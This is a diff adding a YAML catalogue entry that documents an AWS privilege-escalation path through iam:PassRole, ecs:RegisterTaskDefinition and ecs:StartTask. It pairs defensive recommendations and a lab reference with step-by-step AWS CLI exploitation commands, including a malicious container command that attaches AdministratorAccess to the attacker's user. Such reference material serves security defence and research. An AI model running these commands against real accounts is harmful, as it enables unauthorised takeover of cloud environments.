@@ -1,0 +1,226 @@
+id: ecs-005
+name: iam:PassRole + ecs:RegisterTaskDefinition + ecs:StartTask
+category: service-passrole
+services:
+- iam
+- ecs
+description: A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:StartTask` can create a new ECS task definition and attach an existing privileged IAM role to it, then start the task on an existing EC2 container instance. By registering a task definition with a malicious container command and starting it on an EC2-based ECS cluster, the attacker can execute arbitrary code with the permissions of the attached role, allowing privilege escalation. Unlike `ecs:RunTask` which works with both EC2 and Fargate launch types, `ecs:StartTask` is specifically for EC2 launch types and requires specifying an existing container instance ARN. This is a classic "pass role to service" privilege escalation pattern where the combination of task definition registration, role passing, and task execution permissions creates an indirect path to elevated privileges. The level of access gained depends on the permissions of the available roles.
+prerequisites:
+  admin:
+  - An ECS cluster must exist with at least one registered EC2 container instance
+  - A role must exist that trusts ecs-tasks.amazonaws.com to assume it
+  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+  - An ECS cluster must exist with at least one registered EC2 container instance
+  - A role must exist that trusts ecs-tasks.amazonaws.com to assume it
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws sts get-caller-identity
+    description: Get your AWS account ID to construct resource ARNs
+  - step: 2
+    command: aws ecs list-clusters
+    description: Discover available ECS clusters in the account (optional but helpful for finding target cluster)
+  - step: 3
+    command: aws ecs list-container-instances --cluster CLUSTER_NAME
+    description: Retrieve container instance ARNs needed for StartTask command (requires an EC2-based cluster with registered instances)
+  - step: 4
+    command: |
+      aws ecs register-task-definition \
+        --family privesc-task \
+        --network-mode bridge \
+        --task-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
+        --container-definitions '[{
+          "name": "privesc-container",
+          "image": "amazonlinux:latest",
+          "memory": 512,
+          "essential": true,
+          "command": [
+            "/bin/sh",
+            "-c",
+            "aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && echo \"Successfully attached AdministratorAccess!\""
+          ]
+        }]'
+    description: Register a task definition with the privileged role and malicious container command that attaches AdministratorAccess to your user (use bridge network mode for EC2 compatibility)
+  - step: 5
+    command: aws ecs start-task --cluster CLUSTER_NAME --task-definition privesc-task --container-instances CONTAINER_INSTANCE_ARN
+    description: Start the task on a specific container instance to execute the container command with elevated privileges
+  - step: 6
+    command: aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN
+    description: Monitor the task status and wait for completion (status should change to RUNNING then STOPPED)
+  - step: 7
+    command: aws iam list-users --max-items 3
+    description: Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.
+
+  This attack requires:
+  1. The ability to register task definitions (`ecs:RegisterTaskDefinition`)
+  2. The ability to start tasks on existing container instances (`ecs:StartTask`)
+  3. The ability to pass a role to ECS tasks service (`iam:PassRole`)
+  4. An ECS cluster with at least one registered EC2 container instance
+  5. A role that trusts ecs-tasks.amazonaws.com
+
+  Note: `ecs:StartTask` is specifically for EC2 launch types and requires specifying an existing container instance ARN. This differs from `ecs:RunTask`, which works with both EC2 and Fargate launch types and can automatically select placement.
+recommendation: |
+  Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSTaskRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "ecs-tasks.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - **Separate Permissions**: Avoid granting `ecs:RegisterTaskDefinition`, `ecs:StartTask`, and `iam:PassRole` to the same principal
+  - **Restrict Task Definition Registration**: Limit `ecs:RegisterTaskDefinition` to specific task definition family patterns or require approval workflows
+  - **Service Role Controls**: Ensure ECS task roles follow least privilege and cannot modify IAM permissions
+  - **Monitor CloudTrail**: Alert on `RegisterTaskDefinition` API calls where privileged roles are being passed, and monitor `StartTask` executions
+  - **Monitor IAM Changes**: Alert on `AttachUserPolicy`, `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls from ECS task service principals
+  - **Service Control Policies**: Implement SCPs to prevent ECS task roles from modifying IAM policies
+  - **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving ECS and PassRole
+  - **Task Definition Review**: Review task definitions for suspicious container commands or entry points
+  - **Role Trust Policies**: Review roles that trust ecs-tasks.amazonaws.com and ensure they follow least privilege
+  - **Container Instance Access**: Restrict access to EC2 container instances and monitor for suspicious task executions
+discoveredBy:
+  name: "Unknown"
+  organization: "Unknown"
+references: []
+relatedPaths:
+- ecs-001
+- ecs-002
+- ecs-003
+- ecs-004
+- ec2-001
+- lambda-001
+- codebuild-001
+- cloudformation-001
+permissions:
+  required:
+  - permission: iam:PassRole
+    resourceConstraints: Target role ARN must be in the Resource section and must trust ecs-tasks.amazonaws.com
+  - permission: ecs:RegisterTaskDefinition
+    resourceConstraints: Must have permission to register ECS task definitions
+  - permission: ecs:StartTask
+    resourceConstraints: Must have permission to start tasks on existing container instances
+  additional:
+  - permission: ecs:ListClusters
+    resourceConstraints: Helpful for discovering available ECS clusters
+  - permission: ecs:DescribeClusters
+    resourceConstraints: Useful for viewing cluster details and configuration
+  - permission: ecs:ListContainerInstances
+    resourceConstraints: Required to retrieve container instance ARNs needed for StartTask
+  - permission: ecs:DescribeContainerInstances
+    resourceConstraints: Helpful for viewing container instance details and capacity
+  - permission: ecs:DescribeTasks
+    resourceConstraints: Useful for monitoring task execution status and verifying successful exploitation
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles that trust ECS tasks to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
+learningEnvironments:
+  pathfinder-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinder-labs
+    scenario: iam-passrole+ecs-registertaskdefinition+ecs-starttask
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+attackVisualization:
+  nodes:
+  - id: start
+    label: starting-principal
+    type: principal
+    description: |
+      The principal with iam:PassRole, ecs:RegisterTaskDefinition, and ecs:StartTask permissions. Can be an IAM user or role. This path requires an existing ECS cluster with EC2 container instances.
+  - id: task_definition
+    label: ECS Task Definition
+    type: resource
+    description: |
+      The registered ECS task definition with the target role passed via iam:PassRole. Includes a container with commands to execute when launched on an EC2 container instance.
+  - id: ecs_task
+    label: Running ECS Task
+    type: resource
+    description: |
+      An ECS task running on an EC2 container instance, started via ecs:StartTask. Unlike RunTask, StartTask requires specifying the exact container instance ARN and only works with EC2 launch type (not Fargate).
+  - id: target_role
+    label: target-role
+    type: resource
+    description: |
+      The IAM role passed to the task definition. Must trust ecs-tasks.amazonaws.com. The task automatically assumes this role when it runs on the container instance.
+  - id: admin_outcome
+    label: Effective Administrator
+    type: outcome
+    description: |
+      If the target role has administrative permissions, the attacker gains full administrative access via the task's actions executing on the EC2 container instance.
+  - id: partial_outcome
+    label: Check for Additional Access
+    type: outcome
+    color: '#ffeb99'
+    description: |
+      If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation with possible access to sensitive resources.
+  - id: minimal_outcome
+    label: No Additional Access
+    type: outcome
+    color: '#cccccc'
+    description: |
+      If the target role has minimal permissions, the privilege escalation may not provide meaningful additional access.
+  edges:
+  - from: start
+    to: task_definition
+    label: iam:PassRole + ecs:RegisterTaskDefinition
+    description: |
+      The attacker registers a task definition that passes a privileged role. Uses bridge network mode for EC2 compatibility.
+
+      Command:
+      ```bash
+      aws ecs register-task-definition \
+        --family privesc-task \
+        --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
+        --network-mode bridge \
+        --container-definitions '[{"name":"exploit","image":"amazonlinux:latest","memory":512,"command":["/bin/sh","-c","aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]}]'
+      ```
+  - from: task_definition
+    to: ecs_task
+    label: ecs:StartTask
+    description: |
+      The attacker starts the task on a specific EC2 container instance. Unlike RunTask, StartTask requires specifying the container instance ARN.
+
+      Command:
+      ```bash
+      aws ecs start-task \
+        --cluster existing-cluster \
+        --task-definition privesc-task \
+        --container-instances arn:aws:ecs:region:account:container-instance/cluster-name/instance-id
+      ```
+  - from: ecs_task
+    to: target_role
+    label: Task assumes role and executes
+    description: |
+      The task automatically assumes the target role and executes the containerized commands on the EC2 instance with the role's permissions.
+  - from: target_role
+    to: admin_outcome
+    label: If role has admin permissions
+    branch: A
+    condition: admin
+    description: |
+      If the target role has AdministratorAccess or equivalent, the task successfully escalates the starting principal to full administrative access.
+  - from: target_role
+    to: partial_outcome
+    label: If role has some permissions
+    branch: B
+    condition: some_permissions
+    description: |
+      If the target role has elevated but non-administrative permissions, the task performs limited privilege escalation.
+  - from: target_role
+    to: minimal_outcome
+    label: If role has minimal permissions
+    branch: C
+    condition: no_permissions
+    description: |
+      If the target role has minimal permissions, the task may not yield meaningful privilege escalation.
